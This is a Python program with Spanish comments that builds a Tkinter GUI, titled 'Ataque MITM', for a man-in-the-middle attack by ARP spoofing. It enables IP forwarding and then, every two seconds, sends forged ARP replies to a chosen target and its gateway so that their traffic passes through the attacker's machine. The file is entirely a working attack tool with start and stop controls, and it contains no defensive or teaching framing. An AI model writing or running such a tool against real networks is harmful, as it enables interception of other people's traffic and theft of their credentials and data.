import os
import time
import psutil
from scapy.all import *
import tkinter as tk
from tkinter import scrolledtext
from tkinter import ttk
from threading import Thread

# Función de ataque
def ataque_mitm(ip_objetivo, ip_puerta_enlace, interfaz, widget_texto):
    os.system("echo 1 > /proc/sys/net/ipv4/ip_forward") # Habilitar reenvío de paquetes IP en Linux
    # Para Windows la alternativa sería 'netsh interface ipv4 set interface "[Colocar la interfaz utilizada]" forwarding=enabled'

    mac_objetivo = obtener_mac(ip_objetivo)
    mac_puerta_enlace = obtener_mac(ip_puerta_enlace)

    if not mac_objetivo or not mac_puerta_enlace:
        widget_texto.insert(tk.END, "Se introdujo una IP incorrecta o inexistente.\n", 'red')
        widget_texto.see(tk.END)
        os.system("echo 0 > /proc/sys/net/ipv4/ip_forward") # Dehabilitar reenvío de paquetes IP en Linux
        # Para Windows la alternativa sería 'netsh interface ipv4 set interface "[Colocar la interfaz utilizada]" forwarding=disabled'
        return

    # Función para la creación de paquetes ARP Replay envenenados
    def suplantar(ip_objetivo, mac_objetivo, ip_suplantada):
        paquete = Ether(dst=mac_objetivo) / ARP(op=2, pdst=ip_objetivo, hwdst=mac_objetivo, psrc=ip_suplantada)
        sendp(paquete, iface=interfaz, verbose=False)
        widget_texto.insert(tk.END, f"🕱 Paquete ARP suplantado enviado a {ip_objetivo} desde {ip_suplantada} 🕱\n", 'green')
        widget_texto.see(tk.END)

    global detener
    detener = False
    
    # Loop de envio de paquetes ARP falseados cada 2 segundos
    while not detener:
        suplantar(ip_objetivo, mac_objetivo, ip_puerta_enlace)
        suplantar(ip_puerta_enlace, mac_puerta_enlace, ip_objetivo)
        time.sleep(2)
    
    os.system("echo 0 > /proc/sys/net/ipv4/ip_forward") # Para Windows la alternativa sería 'netsh interface ipv4 set interface "[Colocar la interfaz utilizada]" forwarding=disabled'
    widget_texto.insert(tk.END, "Ataque detenido.\n", 'red')
    widget_texto.see(tk.END)

# Función para obtener direcciones MAC
def obtener_mac(ip):
    paquete = ARP(pdst=ip)
    respuesta = sr1(paquete, timeout=2, verbose=False)
    return respuesta.hwsrc if respuesta else None

# Función para iniciar el ataque
def iniciar_ataque_mitm():
    ip_objetivo = entrada_ip_objetivo.get()
    ip_puerta_enlace = entrada_ip_puerta_enlace.get()
    interfaz = combobox_interfaz.get()
    thread = Thread(target=ataque_mitm, args=(ip_objetivo, ip_puerta_enlace, interfaz, texto_salida))
    thread.start()

def detener_ataque():
    global detener
    detener = True

# Sniffer de interfaces de la red interceptada
def obtener_interfaces():
    return psutil.net_if_addrs().keys()

#Interfaz grafica
aplicacion = tk.Tk()
aplicacion.title("Ataque MITM")
aplicacion.configure(bg='black')

opciones_estilo = {'bg': 'black', 'fg': 'lime', 'font': ('Courier', 12)}
estilo_entrada = {'bg': 'black', 'fg': 'lime', 'font': ('Courier', 12), 'insertbackground': 'lime'}

tk.Label(aplicacion, text="IP Objetivo:", **opciones_estilo).pack()
entrada_ip_objetivo = tk.Entry(aplicacion, **estilo_entrada)
entrada_ip_objetivo.pack()

tk.Label(aplicacion, text="IP Puerta de Enlace:", **opciones_estilo).pack()
entrada_ip_puerta_enlace = tk.Entry(aplicacion, **estilo_entrada)
entrada_ip_puerta_enlace.pack()

tk.Label(aplicacion, text="Interfaz:", **opciones_estilo).pack()
interfaces = obtener_interfaces()
combobox_interfaz = ttk.Combobox(aplicacion, values=list(interfaces), font=('Courier', 12))
combobox_interfaz.pack()

# Crear un frame para los botones
frame_botones = tk.Frame(aplicacion, bg='black')
frame_botones.pack()

boton_iniciar = tk.Button(frame_botones, text="Iniciar Ataque", command=iniciar_ataque_mitm, **opciones_estilo)
boton_iniciar.pack(side=tk.LEFT, padx=10)

boton_detener = tk.Button(frame_botones, text="Detener Ataque", command=detener_ataque, **opciones_estilo)
boton_detener.pack(side=tk.LEFT, padx=10)

texto_salida = scrolledtext.ScrolledText(aplicacion, width=50, height=10, bg='black', fg='lime', font=('Courier', 12))
texto_salida.pack()

# Estilo para el texto desplazable
texto_salida.tag_config('green', foreground='lime')
texto_salida.tag_config('red', foreground='red')

aplicacion.mainloop()

